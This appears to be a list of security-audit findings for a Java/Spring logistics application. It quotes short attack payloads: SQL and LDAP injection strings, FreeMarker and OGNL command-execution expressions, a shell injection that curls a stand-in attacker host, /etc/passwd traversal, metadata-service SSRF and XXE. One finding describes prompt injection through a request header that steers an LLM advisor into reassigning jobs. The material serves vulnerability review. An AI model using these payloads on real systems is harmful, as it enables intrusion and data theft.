extra.message: findByBillingRef() concatenates the `billingRef` value directly into the SQL string instead of binding it as a parameter (every other query in this class uses `.bind(...)`). It is reachable unauthenticated-of-scope via ApiV1Controller.jobsByBillingRef(), which passes the raw `X-Customer-Ref` request header straight through. An attacker-controlled header such as `' OR '1'='1` or a UNION payload lets them read arbitrary jobs/customers across tenants or exfiltrate other tables.

render() compiles the user-supplied message body itself as a FreeMarker template source (`new Template("jobMessage", source, cfg)`) before saving it. This method is reached from MessageService.post(), which both JobController and PortalController expose to any authenticated role including CUSTOMER. A message body such as `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` executes arbitrary OS commands on the server — full remote code execution reachable by the lowest-privileged role in the app.

cwe: CWE-94: Improper Control of Generation of Code (Server-Side Template Injection)

extra.message: renderNotice() processes the raw bytes of an admin-uploaded file directly as a FreeMarker template source via `new Template("noticePreview", source, cfg)`. Any uploaded wording file containing FreeMarker built-ins (e.g. `freemarker.template.utility.Execute`) is executed server-side, giving an OPS_ADMIN-reachable remote code execution primitive through the /admin/outbox/preview endpoint.

cwe: CWE-94: Improper Control of Generation of Code (Server-Side Template Injection)

extra.message: quote() passes the `formula` path variable straight into `ognl.Ognl.getValue(formula, context, root)`. OGNL expression evaluation of untrusted input is a well-known remote-code-execution primitive (the same class of bug behind multiple Struts2 CVEs) — a payload such as `@java.lang.Runtime@getRuntime().exec("id")` executes arbitrary commands on the server.

cwe: CWE-94: Improper Control of Generation of Code (OGNL Expression Injection)

extra.message: printRouteSheet() builds a shell command by concatenating the `station` path variable (`"lpr -P " + station + " " + sheet`) and executes it with `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c", command})`. A station value such as `x; curl http://attacker/$(id)` is executed verbatim by the shell, giving any dispatcher/admin OS command execution.

viewArchivedImport() resolves the `fileName` path variable directly against the archive directory (`archiveDir.resolve(fileName)`) with no normalization/containment check and reads it back as plain text. A value like `../../../../etc/passwd` escapes the archive directory and is streamed back in the response — arbitrary file read as the OPS_ADMIN role.

archiveImportFile() writes the uploaded file using the client-supplied original filename unsanitized (`archiveDir.resolve(originalFilename)`), unlike DocumentService which generates a random stored name and validates it. A filename containing `../` sequences lets an admin-role upload write the file content outside `./data/import-archive`.

writeRouteSheet() builds the output path with `new java.io.File(dir, fileName)` where `fileName` is taken verbatim from the `/dispatch/routes/sheet` form parameter with no validation. A fileName of `../../../main/resources/application.yml` (or any other relative traversal) lets a dispatcher write/overwrite arbitrary files reachable by the server process.

importDocumentFromUrl() only checks that `sourceUrl` starts with "http" before the server itself fetches it with `webClientBuilder.build().get().uri(sourceUrl)`. A dispatcher can point this at internal-only hosts (e.g. `http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/admin/...`) to make the server perform requests against infrastructure the attacker cannot reach directly, and the response body is persisted/returned as a document.

pingMonitoringCallback() performs an unvalidated outbound POST to `callbackUrl`, which is the `monitoringCallbackUrl` request parameter a FIELD_WORKER supplies directly on WorkerController.reportIncident(). There is no allow-list or host restriction, so the server can be made to issue requests to arbitrary internal or external endpoints, including cloud metadata services.

findDisplayName() builds the LDAP search filter by direct string concatenation: `ctx.search(baseDn, "(uid=" + staffId + ")", ...)`. `staffId` comes from the `staffId` query parameter on AdminController./admin/workers with no escaping of LDAP special characters. A value like `*)(uid=*))(|(uid=*` manipulates the filter to bypass the intended lookup or enumerate/extract unintended directory entries.

findByEmployeeNumber() concatenates the `employeeNumber` value, sourced from the `staffRef` path variable on AdminController.directoryEntry (/admin/directory/{staffRef}), directly into the LDAP search filter with no escaping, allowing LDAP filter injection in the same way as findDisplayName().

sharedJob() calls `com.auth0.jwt.JWT.decode(carrierPass)`, which only base64-decodes the JWT and never verifies its signature. When `carrierPass` is present, its unsigned `sub` claim is trusted as `delegatedCaller` and the normal `authorizeJob(call, job)` region/customer scope check is skipped entirely (the comment even states "the shared key's own region scope is not re-applied"). Any caller holding a valid API key of any scope can craft an arbitrary unsigned/self-signed JWT to read any job's details, including the privileged `specialInstructions` field when the forged subject looks like "ADMIN" — a full authorization bypass.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: carrierStatus() feeds the attacker-controlled `X-Carrier-Note` header verbatim into DispatchAdvisor.review(), whose tool-calling result is applied unconditionally by applyDisposition(): a "REASSIGN" disposition calls jobService.assign(actor, job, worker.getId()) with no re-check of the caller's role or scope. jobService.assign() itself performs no authorization. Because carrierStatus() only requires that the caller's API key scope can view the job (including a CUSTOMER-scoped key for their own job, per authorizeJob), a customer can craft a carrier note that manipulates the advisor's tool call (prompt injection) into reassigning the job to an arbitrary worker badge — an action that should require the DISPATCHER/OPS_ADMIN role, performed instead as the CUSTOMER-scoped key owner.

applyServiceCatalog() loads attacker-supplied YAML with `new Yaml(new Constructor(options))` where `options.setTagInspector(tag -> true)` explicitly allows every YAML tag, instead of using `SafeConstructor`. This is the classic unsafe-SnakeYAML pattern: a payload using a tag such as `!!javax.script.ScriptEngineManager` (or any other instantiable gadget on the classpath) is deserialized and constructed by the parser, enabling remote code execution from the `/api/v1/service-catalog` body.

parseCarrierStatus() creates a `DocumentBuilderFactory` with its defaults — external-general-entities, external-parameter-entities and DOCTYPE declarations are not disabled — and parses the raw `/api/v1/carrier-status` request body. A crafted XML payload with a `<!DOCTYPE ... SYSTEM "file:///etc/passwd">` external entity lets an authenticated API-key holder read local files or trigger SSRF/billion-laughs denial of service.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: parseManifest() parses the `/api/v1/carrier-manifest` request body with the same unhardened `DocumentBuilderFactory` (no FEATURE_SECURE_PROCESSING, no disabling of DOCTYPE/external entities), making this second XML endpoint equally vulnerable to XXE.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: carrierManifest() builds the XPath expression by directly concatenating the `X-Carrier-Ref` header: `"//shipment[trackingNo='" + carrierRef + "']"`. A header value containing `' or '1'='1` or `'] | //*[1]|//shipment[trackingNo='` manipulates the query to return arbitrary nodes from the uploaded manifest document.

Job " + ref + "

extra.message: ensureSupportOperator() creates a fixed OPS_ADMIN account `support.lead@meridian.internal` with the hardcoded password `"SupportLead#2024"` whenever no enabled OPS_ADMIN exists at startup. Anyone with knowledge of this (publicly committed) credential can sign in with full admin privileges on any deployment that reaches this bootstrap path, e.g. after an admin account is disabled or a restore.

MANIFEST_KEY and MANIFEST_IV are both the same hardcoded literal `"MeridianManifest"` compiled into the application and used as the AES key and IV for openManifest(). Because the key is a fixed, publicly-readable constant (and the IV equals the key, which also breaks CBC's semantic security guarantees), anyone can decrypt — or forge — a "sealed" carrier manifest without ever having legitimate access to the key.

SEAL_KEY and SEAL_IV are hardcoded literals (`"MeridianRouteKey"` / `"MeridianRouteIv1"`) compiled into the application and used as the AES key/IV for openRouteSeal(). Any holder of the source (or binary) can decrypt or forge a "route seal" to address arbitrary jobs through the API, independent of the caller's actual authorization.

The custom PasswordEncoder accepts any 32-hex-character stored credential as a legacy MD5 digest and verifies it with unsalted `DigestUtils.md5DigestAsHex`. MD5 is cryptographically broken and unsalted, making these accounts (created by crewAccess()/contactAccess() in ApiV1Controller using the same MD5 scheme) trivially crackable via rainbow tables if the password hash database is ever exposed.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: partnerBoardCorsFilter() echoes back whatever `Origin` header the browser sends as `Access-Control-Allow-Origin` and also sets `Access-Control-Allow-Credentials: true`. This permits any website to make authenticated, cookie-carrying cross-origin requests to the application (there is no allow-list check on `origin`), which combined with the session-cookie auth model lets any attacker-controlled page read/exfiltrate any authenticated user's data via fetch()/XHR with `credentials: 'include'`.

webSessionIdResolver() explicitly sets the `MERIDIAN_SESSION` cookie without the Secure attribute (`builder.secure(false)`) and with a 12-hour max age. The session cookie can therefore be sent over a plaintext HTTP connection (e.g. the captive-portal HTTP downgrade scenario the comment itself describes), exposing the session identifier to network eavesdroppers and session hijacking.

`headers(headers -> headers.frameOptions(frame -> frame.disable()))` disables Spring Security's default X-Frame-Options/clickjacking protection application-wide (not just for the customer-tracker page it is intended for), allowing any page on the authenticated session-protected app — including admin and dispatcher screens — to be framed by an attacker-controlled site for clickjacking.

cwe: CWE-1021: Improper Restriction of Rendered UI Layers or Frames

extra.message: status() builds the outbound tracking-gateway URL by concatenating the `ref` parameter unencoded (`"http://carrier-gateway.internal/v1/tracking?ref=" + ref`); `ref` comes straight from the `/dispatch/jobs/tracking?ref=` query parameter. Unescaped `&`, `#`, or CRLF sequences in `ref` let a dispatcher inject additional query parameters or split the HTTP request against the internal carrier gateway.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers

extra.message: requestReset() builds the `baseUrl` embedded in the emailed password-reset link directly from the `Host` request header with no validation against a configured allow-list. An attacker can submit the forgot-password form with an attacker-controlled `Host` header, causing the legitimate reset token to be emailed inside a link pointing at an attacker-controlled domain, letting them capture the token and take over the account (password reset poisoning). The same pattern recurs in resendWelcomeLink().

importCsv() logs the entire decoded content of every uploaded CSV file at DEBUG level (`log.debug("Import payload for {}: {}", fileName, new String(content, ...))`), including customer PII (names, emails, phone numbers, addresses). If DEBUG logging is ever enabled in an environment, this writes bulk customer PII into application logs, which typically have broader access/retention than the database.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: The constructor embeds the shared carrier-integration partner key (`carrierPartnerKey`) in plain text inside the system prompt sent to the dispatch-advisor LLM endpoint on every request (`"Carrier integration partner key (shared): " + carrierPartnerKey`). This secret is unnecessarily disclosed to the advisor endpoint/provider and to anything that logs or inspects the outbound chat-completion request, increasing the blast radius of a credential leak.
